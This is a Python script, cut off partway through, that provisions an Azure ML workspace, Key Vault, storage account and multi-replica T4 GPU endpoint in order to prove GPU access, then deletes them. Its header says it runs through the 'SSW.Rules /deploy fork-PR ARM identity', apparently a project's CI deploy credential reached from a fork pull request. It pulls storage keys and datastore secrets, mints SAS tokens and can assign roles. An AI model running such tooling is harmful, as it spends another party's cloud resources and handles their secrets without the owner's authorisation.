#!/usr/bin/env python3
"""C211-I126632: AML MANAGED ONLINE ENDPOINT capacity-N T4 GPU device proof on
subscription b8b18dcf (SSW.Rules '/deploy' fork-PR ARM identity).

x126023 device-proved ONE Standard_NC4as_T4_v3 replica (UUID
GPU-706900c9-...) on this same access, and the in-identity matrix reports the
subscription-wide 'Standard NCASv3_T4 Family' AML dedicated-cores meter
limit 12 / current 0 in westeurope and westus, i.e. N = min(3, 12/4) = 3
replicas are permitted.  x126286 nevertheless self-gated N=0 because its
t4_capacity() looked for a subscription-level entry in locations/{region}/quotas
(which only carries WORKSPACE-scoped quota assignments) -- an own-code defect,
not a provider verdict.  This probe therefore:

  1. reads the T4 limit from the AML locations/{region}/usages endpoint
     (westeurope primary, westus fallback), derives
     N = min(3, floor((limit-current)/4)) and REQUIRES N >= 2;
  2. creates exactly ONE nonce workspace/endpoint/deployment via the
     azure-ai-ml SDK code upload through the workspace datastore, with
     instanceCount = N of Standard_NC4as_T4_v3 (ON-DEMAND only, never spot);
  3. sets the endpoint traffic map to 100% before scoring and POSTs the
     scoring URI repeatedly until every replica's distinct in-container
     nvidia-smi GPU UUID + pod hostname is captured (once per replica);
  4. takes an independent ARM readback (deployment Succeeded, sku.capacity=N);
  5. deletes deployment -> endpoint -> workspace -> KV -> SA and proves
     404 / list-empty for every c211i126632* name.
"""

import base64
import hashlib
import hmac
import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

TAG = "C211_I126632"
ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
NONCE = "i126632"
CODE = "c211-i126632-code"
ENVNAME = "c211-i126632-cuda"
ENDPOINT = "c211-i126632-ep"
DEPLOYMENT = "c211-i126632-dep"
OUTCONT = "c211out"
T0 = time.time()
DEADLINE = 5400            # probe budget (s): 3-replica provisioning + per-replica scoring + slow workspace delete
API_W = "2024-10-01"       # AML workspace/onlineEndpoints/codes/environments
API_C = "2024-04-01"       # AML usages
API_Q = "2024-10-01"       # AML quotas
REG_VER = "2023-07-01"
STG_VER = "2023-01-01"
IMG_MAIN = "mcr.microsoft.com/azureml/minimal-ubuntu22.04-py39-cuda11.8-gpu-inference:latest"
IMG_ALT = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
REGION_LADDER = ["westeurope", "westus"]
QUOTA_REGIONS = ["westeurope", "westus", "eastus", "northeurope"]
SKU_LADDER = ["Standard_NC4as_T4_v3", "Standard_NC8as_T4_v3"]
CAP = 0        # instanceCount N, computed in-identity from AML {region}/usages
CAP_INFO = {}
TAGLINE = "c211 i126632 capacity-N on-demand T4 replica probe"
# residual nonce names owed from earlier lanes of THIS line (all previously
# proven 404 by x125385); re-checked read-only, deleted only if present.
REAP_RES = [
    # x126286 self-gated before any create; prove its names are absent (read-only)
    ("ws", "c211i126286olm", 600), ("kv", "c211i126286kv", 200),
    ("sa", "c211i12628626f808", 200),
]

SCORE_PY = r'''import json
import os
import socket
import subprocess


def _sh(args):
    try:
        p = subprocess.run(args, capture_output=True, text=True, timeout=120)
        out = (p.stdout or "") + (p.stderr or "")
        return out.strip()
    except Exception as e:  # noqa: BLE001
        return "ERR " + repr(e)


def init():
    pass


def run(raw_data):
    out = {
        "tag": "C211-I126632 IN-CONTAINER DEVICE PROBE",
        "host": socket.gethostname(),
        "nvidia_smi_L": _sh(["nvidia-smi", "-L"]),
        "nvidia_smi_query": _sh(["nvidia-smi", "--query-gpu=name,uuid,memory.total,driver_version", "--format=csv"]),
        "nvidia_smi": _sh(["nvidia-smi"]),
        "lspci": _sh(["bash", "-lc", "lspci -nn 2>/dev/null | grep -i -E 'vga|3d|nvidia' ; true"]),
        "env": {k: v for k, v in os.environ.items() if k.startswith("C211")},
    }
    return out
'''

GTOK = None



def t4_capacity_usages(summary, reg):
    """N from the AML subscription-level vmFamily/dedicatedCores USAGES endpoint.

    Defect x126286 fixed: it looked for a subscription-level dedicated-cores entry
    in locations/{reg}/quotas, but that collection only carries WORKSPACE-scoped
    quota assignments (workspace c211i122276aml), so `sub` stayed None and the
    probe self-gated N=0 although the SAME in-identity matrix reported the
    family limit 12 / current 0.  The subscription-wide meter lives in
    locations/{reg}/usages and is the pool a fresh workspace inherits.
    """
    out = {"region": reg}
    hits = (((summary.get("quota") or {}).get(reg + "/usages") or {}).get("hits") or [])
    best = None
    for h in hits:
        if not re.search(r"(?i)ncasv3_t4|ncas|_t4", (h.get("name") or "") + " " +
                         (h.get("loc") or "")):
            continue
        fields = dict(h.get("fields") or [])
        lim = cur = None
        for k, v in fields.items():
            lk = str(k).lower()
            if lk.endswith("/limit") and lim is None:
                lim = v
            if "currentvalue" in lk and cur is None:
                cur = v
        try:
            lim = int(float(lim)); cur = int(float(cur or 0))
        except Exception:  # noqa: BLE001
            continue
        rec = {"meter": h.get("name"), "limit": lim, "current": cur,
               "type": (h.get("type") or None)}
        if best is None or lim > best["limit"]:
            best = rec
    if not best:
        out.update({"verdict": "no AML usages entry for the T4 family", "n": 0})
        return out
    free = best["limit"] - best["current"]
    out.update(best)
    out["free_vcpu"] = free
    out["n"] = max(0, min(3, free // 4))
    out["formula"] = "N=min(3,floor((limit-current)/4)) on Standard NCASv3_T4 Family"
    return out




def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print((TAG + " " + json.dumps(obj, default=str))[:3600], flush=True)


def run(cmd, timeout=300):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": (p.stderr or "")[-800:]}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def armh(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            h = {k.lower(): v for k, v in r.headers.items()}
            h.pop("authorization", None)
            try:
                return r.status, json.loads(raw), h
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}, h
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        h = {k.lower(): v for k, v in e.headers.items()} if e.headers else {}
        try:
            return e.code, json.loads(raw), h
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1500]}, h
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}, {}


def arm(tok, url, method="GET", body=None, timeout=120):
    st, b, _ = armh(tok, url, method, body, timeout)
    return st, b


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:12000]
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:2500]
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400]


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"),
                    "message": (e.get("message") or "")[:1200]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:1200]}
        return {"http": st, "body": json.dumps(body)[:900]}
    return {"http": st}


def prov_state(body):
    if isinstance(body, dict):
        return (body.get("properties") or {}).get("provisioningState")
    return None


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=6):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def put_blob(bbase, container, path, data, q):
    url = "%s/%s/%s?%s" % (bbase, container, path, q)
    rc, bc = httptext(url, method="PUT", body=data, headers={
        "x-ms-blob-type": "BlockBlob", "x-ms-version": "2022-11-02",
        "Content-Type": "application/octet-stream"}, timeout=180)
    return rc, bc


def grant(tok, sid, scope_id, principal, role, label):
    ra = str(uuid.uuid4())
    url = (ARM + scope_id + "/providers/Microsoft.Authorization/roleAssignments/" + ra +
           "?api-version=2022-04-01")
    body = {"properties": {
        "roleDefinitionId": "/subscriptions/%s/providers/Microsoft.Authorization/"
                            "roleDefinitions/%s" % (sid, role),
        "principalId": principal, "principalType": "ServicePrincipal"}}
    st, b = arm(tok, url, "PUT", body, timeout=90)
    emit({"step": "role-assign", "label": label, "http": st,
          "code": (b.get("error", {}) or {}).get("code") if isinstance(b, dict) else None})
    return st


def stage_reap(tok, base):
    """Reap every residual nonce resource owed from the earlier x125052/x125197/
    x125315/x125385 runs (proven 404 before; deleted only if somehow present)."""
    out = {}
    tmap = {"ws": ("Microsoft.MachineLearningServices/workspaces/", API_W),
            "kv": ("Microsoft.KeyVault/vaults/", REG_VER),
            "sa": ("Microsoft.Storage/storageAccounts/", STG_VER)}
    for kind, name, budget in REAP_RES:
        frag, ver = tmap[kind]
        url = base + "/" + frag + name + "?api-version=" + ver
        pre, _pb = arm(tok, url, "GET", None, timeout=60)
        final = pre
        dhttp = None
        if pre == 200:
            dhttp, _db = arm(tok, url, "DELETE", None, timeout=120)
            t0 = time.time()
            while time.time() - t0 < budget:
                time.sleep(8)
                st2, _b2 = arm(tok, url, "GET", None, timeout=60)
                final = st2
                if st2 == 404:
                    break
        out[name] = {"pre": pre, "delete": dhttp, "final": final}
        emit({"step": "reap", "kind": kind, "name": name, "pre": pre,
              "delete": dhttp, "final": final})
    return out


def left():
    return DEADLINE - (time.time() - T0)


def del_and_wait(tok, url, label, budget, res):
    st, b = arm(tok, url, "DELETE", None, timeout=180)
    emit({"step": "delete", "label": label, "http": st,
          "code": (b.get("error", {}) or {}).get("code") if isinstance(b, dict) else None})
    t0 = time.time()
    final = st
    while time.time() - t0 < budget:
        time.sleep(10)
        st2, _b2 = arm(tok, url, "GET", None, timeout=90)
        final = st2
        if st2 == 404:
            break
    res["cleanup"][label] = {"delete_http": st, "final_get_http": final,
                             "t": round(time.time() - t0)}
    emit({"step": "delete-readback", "label": label, "final": final,
          "t": round(time.time() - t0)})
    return final


def fetch_dep_logs(tok, wsu, res, phase, tail=2000):
    """Fetch the deployment's own logs via POST .../getLogs per containerType
    (StorageInitializer / Init / InferenceServer) plus the legacy GET /logs path.
    Records every HTTP status verbatim; extracts any GPU- UUID lines."""
    out = {}
    path = (wsu + "/onlineEndpoints/" + ENDPOINT + "/deployments/" + DEPLOYMENT)
    for ct in ("StorageInitializer", "Init", "InferenceServer"):
        st, b = arm(tok, path + "/getLogs?api-version=" + API_W, "POST",
                    {"containerType": ct, "tail": tail}, timeout=90)
        txt = ""
        if isinstance(b, dict):
            for k in ("content", "log", "text", "raw"):
                v = b.get(k)
                if isinstance(v, str) and len(v) > len(txt):
                    txt = v
            if not txt:
                txt = json.dumps(b)
        elif isinstance(b, (bytes, str)):
            txt = str(b)
        uu = sorted(set(re.findall(r"GPU-[0-9a-fA-F-]{16,}", txt)))
        out[ct] = {"http": st, "len": len(txt), "uuids": uu,
                   "excerpt": txt[:3000]}
        emit({"step": "dep-logs", "phase": phase, "container": ct, "http": st,
              "len": len(txt), "uuids": uu, "head": txt[:1200],
              "tail": txt[-800:]})
    st, b = arm(tok, path + "/logs?api-version=" + API_W, timeout=60)
    if isinstance(b, str):
        txt = b
    elif isinstance(b, dict):
        txt = json.dumps(b)
    else:
        txt = str(b)
    out["GET_logs"] = {"http": st, "len": len(txt), "excerpt": txt[:2000]}
    emit({"step": "dep-logs", "phase": phase, "container": "GET:/logs",
          "http": st, "len": len(txt), "head": txt[:600]})
    res.setdefault("dep_logs_multi", {})[phase] = out
    return out


def teardown(tok, sid, base, rbase, own, res):
    if own.get("dep"):
        del_and_wait(tok, base + "/Microsoft.MachineLearningServices/workspaces/" + own["ws"] +
                     "/onlineEndpoints/" + ENDPOINT + "/deployments/" + DEPLOYMENT +
                     "?api-version=" + API_W, "deployment", 420, res)
    if own.get("ep"):
        del_and_wait(tok, base + "/Microsoft.MachineLearningServices/workspaces/" + own["ws"] +
                     "/onlineEndpoints/" + ENDPOINT + "?api-version=" + API_W,
                     "endpoint", 420, res)
        st, lb = arm(tok, base + "/Microsoft.MachineLearningServices/workspaces/" + own["ws"] +
                     "/onlineEndpoints?api-version=" + API_W, timeout=90)
        names = [x.get("name") for x in ((lb.get("value") or [])
                                         if isinstance(lb, dict) else [])]
        res["cleanup"]["onlineEndpoints_list_after"] = {"http": st, "names": names}
        emit({"step": "ep-list-after", "http": st, "names": names})
    if own.get("ws"):
        wurl = (base + "/Microsoft.MachineLearningServices/workspaces/" + own["ws"] +
                "?api-version=" + API_W)
        wsfinal = del_and_wait(tok, wurl, "workspace", 700, res)
        tries = 1
        while wsfinal != 404 and tries < 4:
            tries += 1
            time.sleep(20)
            wsfinal = del_and_wait(tok, wurl, "workspace-retry-%d" % tries, 420, res)
        res["cleanup"]["workspace_final"] = wsfinal
        emit({"step": "workspace-final", "final": wsfinal, "tries": tries})
    if own.get("kv"):
        del_and_wait(tok, base + "/Microsoft.KeyVault/vaults/" + own["kv"] +
                     "?api-version=" + REG_VER, "kv", 260, res)
    if own.get("sa"):
        del_and_wait(tok, base + "/Microsoft.Storage/storageAccounts/" + own["sa"] +
                     "?api-version=" + STG_VER, "sa", 320, res)
    st, rl = arm(tok, ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                 "/resources?api-version=2021-04-01")
    mine = [{"name": x.get("name"), "type": x.get("type")}
            for x in ((rl.get("value") or []) if isinstance(rl, dict) else [])
            if str(x.get("name", "")).lower().startswith(("c211i126632",
                                                          "c211-i126632"))]
    res["cleanup"]["rg_inventory_c211_i126632"] = mine
    emit({"step": "rg-inventory-final", "http": st, "c211_i126632": mine})


def region_names(idx, loc):
    """Fresh NONCE-derived nonce names (KV soft-delete quarantines old names)."""
    h = hashlib.sha256((NONCE + "|" + loc).encode()).hexdigest()[:6]
    tag = "c211" + NONCE
    if idx == 0:
        return {"ws": tag + "olm", "kv": tag + "kv",
                "sa": (tag + h)[:24].lower()}
    return {"ws": tag + "ol" + loc[:2], "kv": tag + "kv%d" % (idx + 1),
            "sa": (tag + h)[:24].lower()}


def qdecode(m):
    nm = m.get("name")
    if isinstance(nm, dict):
        name, lloc = (nm.get("value") or ""), (nm.get("localizedValue") or "")
    else:
        name, lloc = (nm or ""), ""
    props = m.get("properties") if isinstance(m.get("properties"), dict) else {}
    seen = []

    def walk(x, path=""):
        if isinstance(x, dict):
            for k, v in x.items():
                p2 = path + "/" + str(k)
                lk = str(k).lower()
                if lk in ("limit", "currentvalue", "usage", "unit", "quotatype"):
                    if isinstance(v, (int, float, str)) and not isinstance(v, dict):
                        seen.append((p2, v))
                elif isinstance(v, dict):
                    walk(v, p2)
    walk(props)
    return {"name": name, "localized": lloc, "fields": seen[:8]}


def quota_scan(tok, sid, regions, summary):
    out = {}
    for reg in regions:
        for api, ver in (("usages", API_C), ("quotas", API_Q)):
            url = (ARM + "/subscriptions/" + sid +
                   "/providers/Microsoft.MachineLearningServices/locations/" + reg +
                   "/" + api + "?api-version=" + ver)
            st, b = arm(tok, url, timeout=120)
            n = len((b.get("value") or []) if isinstance(b, dict) else [])
            hits = []
            for m in ((b.get("value") or []) if isinstance(b, dict) else []):
                d = qdecode(m)
                nm = (d["name"] + " " + d["localized"]).lower()
                if any(t in nm for t in ("ncas", "t4", "nv", "nc", "a100", "dedicated",
                                         "online", "gpu")):
                    hits.append({"name": d["name"],
                                 "loc": d["localized"],
                                 "fields": d["fields"]})
            out[reg + "/" + api] = {"http": st, "n": n, "hits": hits[:40]}
            emit({"step": "aml-" + api, "region": reg, "http": st, "n": n,
                  "gpu_hits": [h["name"] + "=" + str(h["fields"]) for h in hits[:12]]})
    summary["quota"] = out
    return out


def free_vcpu(quota, reg, pat):
    """Best-effort decode: find a meter whose name matches pat and return limit-current."""
    best = None
    for api in ("usages", "quotas"):
        for h in ((quota.get(reg + "/" + api) or {}).get("hits") or []):
            nm = (h["name"] + " " + h["loc"]).lower()
            if not re.search(pat, nm):
                continue
            lim = cur = None
            for path, v in h["fields"]:
                lk = path.lower()
                if lk.endswith("/limit") and lim is None:
                    lim = v
                if ("currentvalue" in lk or lk.endswith("/usage")) and cur is None:
                    cur = v
            try:
                lim = float(lim) if lim not in (None, "") else None
                cur = float(cur) if cur not in (None, "") else 0.0
            except Exception:  # noqa: BLE001
                pass
            if lim is None:
                continue
            cand = {"meter": h["name"], "limit": lim, "current": cur,
                    "free": (lim - cur) if (lim is not None and cur is not None) else None}
            if cand["free"] is not None and (best is None or cand["free"] > best["free"]):
                best = cand
    return best


def sdk_assets(sid, rg, ws, res):
    """Register a REAL azureml code asset through the workspace default datastore
    (SDK-side upload) plus a CUDA GPU inference environment."""
    res["sdk"] = {"import_ok": False, "datastore": None, "code": None, "env": None}
    try:
        from azure.ai.ml import MLClient
        from azure.identity import AzureCliCredential
        from azure.ai.ml.entities import Environment
        try:
            from azure.ai.ml.entities._assets import Code as CodeAsset
        except Exception:  # noqa: BLE001
            from azure.ai.ml.entities._assets._artifacts.code import Code as CodeAsset
        import azure.ai.ml as _aml
        ver = getattr(_aml, "__version__", "?")
        res["sdk"]["import_ok"] = True
        res["sdk"]["version"] = ver
        emit({"step": "sdk-import", "ok": True, "version": ver})
    except Exception as e:  # noqa: BLE001
        emit({"step": "sdk-import", "ok": False, "err": repr(e)[:700]})
        res["sdk"]["import_err"] = repr(e)[:700]
        return
    try:
        ml = MLClient(credential=AzureCliCredential(), subscription_id=sid,
                      resource_group_name=rg, workspace_name=ws)
        ds = ml.datastores.get_default()
        res["sdk"]["datastore"] = {
            "name": getattr(ds, "name", None), "type": str(getattr(ds, "type", None)),
            "account": getattr(ds, "account_name", None),
            "container": getattr(ds, "container_name", None)}
        emit({"step": "sdk-datastore", **res["sdk"]["datastore"]})
    except Exception as e:  # noqa: BLE001
        emit({"step": "sdk-datastore", "ok": False, "err": repr(e)[:900]})
        res["sdk"]["datastore_err"] = repr(e)[:900]
        return
    # ---- code asset: SDK upload through the datastore ----
    try:
        os.makedirs("./c211code", exist_ok=True)
        with open("./c211code/score.py", "w") as fh:
            fh.write(SCORE_PY)
        ops = getattr(ml, "code", None) or getattr(ml, "_code", None)
        if ops is None:
            raise RuntimeError("MLClient exposes no code operations")
        c = ops.create_or_update(CodeAsset(name=CODE, version="1",
                                           path="./c211code",
                                           description="c211 i126632 scoring code"))
        res["sdk"]["code"] = {"id": getattr(c, "id", None),
                              "path": getattr(c, "path", None),
                              "name": getattr(c, "name", None),
                              "version": getattr(c, "version", None)}
        emit({"step": "sdk-code", "ok": bool(getattr(c, "id", None)),
              "id": str(getattr(c, "id", None))[-120:],
              "path": str(getattr(c, "path", None))[:240]})
    except Exception as e:  # noqa: BLE001
        emit({"step": "sdk-code", "ok": False, "err": repr(e)[:1400]})
        res["sdk"]["code_err"] = repr(e)[:1400]
    # ---- environment asset ----
    for img in (IMG_MAIN, IMG_ALT):
        try:
            env = Environment(name=ENVNAME, version="1", image=img,
                              os_type="Linux",
                              description="c211 i126632 cuda inference")
            e = ml.environments.create_or_update(env)
            res["sdk"]["env"] = {"id": getattr(e, "id", None),
                                 "image": img.split("/")[-1]}
            emit({"step": "sdk-env", "ok": bool(getattr(e, "id", None)),
                  "id": str(getattr(e, "id", None))[-120:]})
            break
        except Exception as e:  # noqa: BLE001
            emit({"step": "sdk-env", "ok": False, "image": img.split("/")[-1],
                  "err": repr(e)[:1000]})
            res["sdk"]["env_err"] = repr(e)[:1000]


def manual_code_asset(tok, wsu, res):
    """Fallback: ARM startPendingUpload -> service SAS -> blob upload -> code asset."""
    tries = []
    code_id = None
    st, sb = arm(tok, wsu + "/codes/" + CODE + "/versions/1/startPendingUpload"
                 "?api-version=" + API_W, "POST",
                 {"pendingUploadType": "TemporaryBlobReference"}, timeout=150)
    br = ((sb.get("blobReferenceForConsumption") or {})
          if isinstance(sb, dict) else {})
    blob_uri = br.get("blobUri")
    sas_uri = ((br.get("credential") or {}).get("sasUri")
               if isinstance(br.get("credential"), dict) else None)
    emit({"step": "pending-upload", "http": st, "blob_uri": (blob_uri or "")[:200],
          "sas_present": bool(sas_uri),
          "code": (sb.get("error", {}) or {}).get("code") if isinstance(sb, dict) else None,
          "msg": ((sb.get("error", {}) or {}).get("message") or "")[:400]
                 if isinstance(sb, dict) else None})
    tries.append({"form": "startPendingUpload", "http": st,
                  "blob_uri": blob_uri,
                  "err": (sb.get("error") if isinstance(sb, dict) else None)})
    if st in (200, 201) and blob_uri and sas_uri:
        q = sas_uri.split("?", 1)[1] if "?" in sas_uri else ""
        base = blob_uri.rstrip("/")
        # upload score.py as a blob inside the pending-upload location
        target = base + "/score.py"
        rc, _rb = httptext(target + ("?" + q if q else ""), method="PUT",
                           body=SCORE_PY.encode(),
                           headers={"x-ms-blob-type": "BlockBlob",
                                    "x-ms-version": "2022-11-02",
                                    "Content-Type": "text/x-python"}, timeout=180)
        emit({"step": "pending-put", "http": rc, "target": target[:200]})
        for uri in (base, base + "/"):
            st2, cb = arm(tok, wsu + "/codes/" + CODE + "/versions/1?api-version=" + API_W,
                          "PUT", {"properties": {"codeUri": uri,
                                                 "description": "c211 i126632 fallback"}},
                          timeout=180)
            tries.append({"form": "pendingUpload-folder", "uri": uri, "http": st2,
                          "code": ((cb.get("error", {}) or {}).get("code")
                                   if isinstance(cb, dict) else None),
                          "msg": ((cb.get("error", {}) or {}).get("message") or "")[:400]
                                 if isinstance(cb, dict) else None})
            emit({"step": "code-create", "uri": uri[:180], "http": st2,
                  "code": tries[-1]["code"], "msg": tries[-1]["msg"]})
            if st2 in (200, 201):
                code_id = ((cb.get("id") if isinstance(cb, dict) else None) or uri)
                break
            if st2 != 400:
                break
    res["sdk"]["manual"] = {"tries": tries, "code_id": code_id}
    return code_id


def manual_env_asset(tok, wsu, res):
    """Fallback: register the CUDA inference environment through ARM."""
    for img in (IMG_MAIN, IMG_ALT):
        st, eb = arm(tok, wsu + "/environments/" + ENVNAME + "/versions/1"
                     "?api-version=" + API_W, "PUT",
                     {"properties": {"image": img, "osType": "Linux",
                                     "description": "c211 i126632 cuda"}},
                     timeout=180)
        emit({"step": "env-create-arm", "image": img.split("/")[-1], "http": st,
              **({} if st in (200, 201) else err_of(st, eb))})
        if st in (200, 201):
            env_id = ((eb.get("id") if isinstance(eb, dict) else None) or
                      (wsu + "/environments/" + ENVNAME + "/versions/1"))
            res["sdk"]["env"] = {"id": env_id, "image": img.split("/")[-1],
                                 "via": "arm"}
            return env_id
    return None


def _find_secret(x, keys=("sastoken", "sasuri", "key", "secret")):
    if isinstance(x, dict):
        for k, v in x.items():
            if str(k).lower() in keys and isinstance(v, str) and len(v) > 10:
                return str(k), v
            got = _find_secret(v, keys)
            if got:
                return got
    elif isinstance(x, list):
        for v in x:
            got = _find_secret(v, keys)
            if got:
                return got
    return None


def datastore_code_asset(tok, wsu, res):
    """Fallback 2: POST datastores/<default>/listSecrets -> SAS -> upload
    score.py into the workspace datastore container -> code asset folder URI."""
    out = {"tries": []}
    st, db = arm(tok, wsu + "/datastores?api-version=" + API_W, timeout=90)
    ds = None
    for d in ((db.get("value") or []) if isinstance(db, dict) else []):
        pr = d.get("properties") or {}
        if pr.get("isDefault") or d.get("name") == "workspaceblobstore":
            ds = d
            break
    if not ds:
        emit({"step": "ds-listSecrets", "http": st, "found": False})
        out["err"] = "no default datastore"
        res["sdk"]["manual2"] = out
        return None
    name = ds.get("name")
    pr = ds.get("properties") or {}
    acct = pr.get("accountName")
    cont = pr.get("containerName")
    emit({"step": "ds-default", "http": st, "name": name, "account": acct,
          "container": cont, "dtype": pr.get("datastoreType")})
    st2, sb = arm(tok, wsu + "/datastores/" + name + "/listSecrets"
                  "?api-version=" + API_W, "POST",
                  {"expirableSecret": True, "expireAfterHours": 1}, timeout=90)
    found = _find_secret(sb)
    kind, secret = (found if found else (None, None))
    emit({"step": "ds-listSecrets", "http": st2, "kind": kind,
          "present": bool(secret),
          "code": (sb.get("error", {}) or {}).get("code") if isinstance(sb, dict) else None})
    out["listSecrets"] = {"http": st2, "kind": kind, "present": bool(secret)}
    if not (acct and cont and secret):
        res["sdk"]["manual2"] = out
        return None
    bbase = "https://" + acct + ".blob.core.windows.net"
    q = secret.lstrip("?")
    if kind and kind.lower() == "key":
        q, _e = sa_sas(acct, secret, perm="rwdlc", hours=2)
    up = bbase + "/" + cont + "/c211/i126632/code/score.py?" + q
    rc, _rb = httptext(up, method="PUT", body=SCORE_PY.encode(),
                       headers={"x-ms-blob-type": "BlockBlob",
                                "x-ms-version": "2022-11-02",
                                "Content-Type": "text/x-python"}, timeout=180)
    emit({"step": "ds-put", "http": rc, "target": up.split("?")[0][:220]})
    out["put_http"] = rc
    if rc not in (200, 201):
        res["sdk"]["manual2"] = out
        return None
    folder = bbase + "/" + cont + "/c211/i126632/code"
    st3, cb = arm(tok, wsu + "/codes/" + CODE + "/versions/1?api-version=" + API_W,
                  "PUT", {"properties": {"codeUri": folder,
                                         "description": "c211 i126632 ds fallback"}},
                  timeout=180)
    emit({"step": "code-create", "uri": folder[:200], "http": st3,
          "code": (cb.get("error", {}) or {}).get("code") if isinstance(cb, dict) else None,
          "msg": ((cb.get("error", {}) or {}).get("message") or "")[:400]
                 if isinstance(cb, dict) else None})
    out["tries"].append({"form": "datastore-folder", "uri": folder, "http": st3})
    code_id = None
    if st3 in (200, 201):
        code_id = ((cb.get("id") if isinstance(cb, dict) else None) or folder)
    res["sdk"]["manual2"] = out
    return code_id


def run_region(tok, sid, tenant, base, rbase, idx, loc, quota, summary):
    names = region_names(idx, loc)
    ws, kv, sa = names["ws"], names["kv"], names["sa"]
    own = {}
    res = {"loc": loc, "names": names, "endpoint": {}, "deployment": {},
           "score": {}, "cleanup": {}, "code_id": None, "env_id": None,
           "gpu_uuids": [], "try_next_region": False}
    summary["regions"].append(res)
    emit({"step": "region-start", "idx": idx, "loc": loc, **names})

    # ---------- A. dependencies ----------
    saurl = base + "/Microsoft.Storage/storageAccounts/" + sa + "?api-version=" + STG_VER
    st, b = arm(tok, saurl, "PUT",
                {"location": loc, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
                 "tags": {"c211": NONCE},
                 "properties": {"allowBlobPublicAccess": False,
                                "minimumTlsVersion": "TLS1_2",
                                "supportsHttpsTrafficOnly": True,
                                "networkAcls": {"bypass": "AzureServices",
                                                "defaultAction": "Allow"}}}, timeout=240)
    emit({"step": "sa-create", "name": sa, **err_of(st, b)})
    hkey = None
    if st in (200, 201, 202):
        for _ in range(20):
            stp, bp = arm(tok, saurl, timeout=60)
            if prov_state(bp) in ("Succeeded", "Failed"):
                break
            time.sleep(8)
        st, kb = arm(tok, base + "/Microsoft.Storage/storageAccounts/" + sa +
                     "/listKeys?api-version=" + STG_VER, "POST", {}, timeout=90)
        try:
            hkey = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit({"step": "sa-keys", "http": st, "got": bool(hkey)})
        if hkey:
            q, _se = sa_sas(sa, hkey)
            bbase = "https://" + sa + ".blob.core.windows.net"
            stc, _bc = httptext(bbase + "/" + OUTCONT + "?restype=container&" + q,
                                method="PUT")
            emit({"step": "out-container", "http": stc})
            rq, _rexp = sa_sas(sa, hkey, perm="r", hours=8)
            summary["out_url"] = (bbase + "/" + OUTCONT + "/" + NONCE +
                                  "-summary.json?" + rq)
            own["sa"] = sa
            res["sa"] = sa

    kvurl = base + "/Microsoft.KeyVault/vaults/" + kv + "?api-version=" + REG_VER
    st, b = arm(tok, kvurl, "PUT",
                {"location": loc, "tags": {"c211": NONCE},
                 "properties": {"tenantId": tenant,
                                "sku": {"family": "A", "name": "standard"},
                                "accessPolicies": [], "enableSoftDelete": True,
                                "enableRbacAuthorization": True}}, timeout=180)
    emit({"step": "kv-create", "name": kv, **err_of(st, b)})
    kv_id = (rbase + "/Microsoft.KeyVault/vaults/" + kv) if st in (200, 201, 202) else None
    if kv_id:
        own["kv"] = kv
        res["kv"] = kv

    appi_id = None
    st, rl = arm(tok, ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                 "/resources?api-version=2021-04-01")
    for x in ((rl.get("value") or []) if isinstance(rl, dict) else []):
        if (x.get("type") or "").lower() == "microsoft.insights/components" and not appi_id:
            appi_id = x.get("id")
    emit({"step": "appi-reuse", "found": bool(appi_id)})

    # ---------- B. workspace ----------
    wurl = base + "/Microsoft.MachineLearningServices/workspaces/" + ws + \
        "?api-version=" + API_W
    props = {"friendlyName": "c211-i126632 nonce online-endpoint workspace",
             "hbiWorkspace": False, "v1LegacyMode": False,
             "storageAccount": rbase + "/Microsoft.Storage/storageAccounts/" + sa}
    if kv_id:
        props["keyVault"] = kv_id
    if appi_id:
        props["applicationInsights"] = appi_id
    wbody = {"location": loc, "tags": {"c211": NONCE},
             "identity": {"type": "SystemAssigned"},
             "sku": {"name": "Basic", "tier": "Basic"}, "properties": props}
    st, b, hdrs = armh(tok, wurl, "PUT", wbody, timeout=300)
    async_url = hdrs.get("azure-asyncoperation") or hdrs.get("location")
    emit({"step": "ws-create", **err_of(st, b), "async_op": bool(async_url)})
    ws_state = None
    if st in (200, 201, 202):
        own["ws"] = ws
        res["ws"] = ws
